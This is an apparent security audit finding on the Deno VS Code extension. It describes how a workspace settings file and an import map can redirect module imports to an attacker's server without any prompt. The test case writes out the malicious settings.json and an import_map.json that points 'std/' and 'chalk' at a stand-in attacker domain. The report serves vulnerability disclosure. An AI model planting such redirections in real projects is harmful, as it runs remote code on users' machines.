# Vulnerabilities in Deno for Visual Studio Code

## Import Map Redirection Attack

### Description
A malicious actor can create a project with a custom import map that redirects legitimate-looking imports to attacker-controlled code. When a user with the Deno extension enabled opens this project, the custom import map is applied without any explicit confirmation. When Deno code is executed, the imports are resolved using the attacker-controlled import map, resulting in loading and executing malicious code.

Step by step:
1. Attacker creates a project containing:
   - A malicious import map (e.g., `import_map.json`) that redirects standard or popular module imports to attacker-controlled URLs
   - A workspace configuration (`.vscode/settings.json`) with `"deno.enable": true` and `"deno.importMap": "./import_map.json"`
   - JavaScript/TypeScript files that import modules which appear legitimate
2. User clones/downloads and opens the project in VS Code
3. The Deno extension automatically loads the workspace settings
4. When the user runs or tests the code (or when cache-on-save is enabled), Deno uses the malicious import map to resolve imports
5. The attacker's code is downloaded and executed in the user's environment

### Impact
Critical. This attack could lead to arbitrary code execution in the user's environment. The malicious code would run with the user's permissions and could:
- Access local files accessible to the user
- Exfiltrate sensitive data
- Install malware or backdoors
- Modify project files or other accessible files

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension does show a warning when enabling import suggestions from untrusted hosts (in the `createRegistryStateHandler` function), but this does not apply to import maps themselves.

### Missing Mitigations
1. The extension should warn users when a project tries to set a custom import map in workspace settings
2. The extension could implement a trusted project mechanism to prevent automatically loading potentially dangerous settings from untrusted projects
3. Import maps could be restricted to only load from trusted domains by default

### Preconditions
1. User must have the Deno extension for VS Code installed
2. User must open a project containing a malicious import map configuration
3. User must run Deno code or have cache-on-save enabled

### Source Code Analysis
The vulnerability exists in several parts of the codebase:

1. In `client/src/debug_config_provider.ts`, the extension reads the import map configuration and passes it to Deno:
```typescript
#getAdditionalRuntimeArgs() {
  const args: string[] = [];
  const settings = this.#extensionContext.clientOptions.initializationOptions();
  // ...
  if (settings.importMap) {
    args.push("--import-map");
    args.push(settings.importMap.trim());
  }
  // ...
  return args;
}
```

2. In `client/src/extension.ts`, the extension loads configuration from workspace settings without validation:
```typescript
initializationOptions: () => {
  const denoConfiguration = vscode.workspace.getConfiguration().get(
    EXTENSION_NS,
  ) as Record<string, unknown>;
  commands.transformDenoConfiguration(extensionContext, denoConfiguration);
  return {
    ...denoConfiguration,
    // ...
  } as object;
},
```

3. This configuration is then used when executing Deno commands and tasks, as seen in `client/src/tasks.ts` and `client/src/commands.ts`.

The critical issue is that the import map value comes directly from workspace settings without validation or user prompt. As VS Code automatically applies workspace settings when opening a project, a malicious project can define a dangerous import map that will be used without the user's knowledge.

### Security Test Case
1. Create a `malicious_project` directory containing:
   ```
   malicious_project/
   ├── .vscode/
   │   └── settings.json
   ├── import_map.json
   └── app.ts
   ```

2. In `.vscode/settings.json`, add:
   ```json
   {
     "deno.enable": true,
     "deno.importMap": "./import_map.json",
     "deno.cacheOnSave": true
   }
   ```

3. In `import_map.json`, create a redirection:
   ```json
   {
     "imports": {
       "std/": "https://malicious-domain.com/fake-std-lib/",
       "chalk": "https://malicious-domain.com/fake-chalk.js"
     }
   }
   ```

4. In `app.ts`, add code that uses the redirected imports:
   ```typescript
   import { bold } from "chalk";
   import { log } from "std/log/mod.ts";

   log.info(bold("Loading secure application..."));
   // The rest of the seemingly legitimate application
   ```

5. Set up a server at `malicious-domain.com` that serves malicious code at the imported paths

6. When a user opens this project in VS Code:
   - The Deno extension sees the workspace settings and enables Deno
   - The import map configuration is applied without warning
   - When the file is saved, cache-on-save tries to cache the imports
   - The malicious code from `malicious-domain.com` is downloaded and executed
   - The attacker's code runs with the user's permissions

The user would have no indication that the imports were redirected to malicious sources, demonstrating a complete attack path.
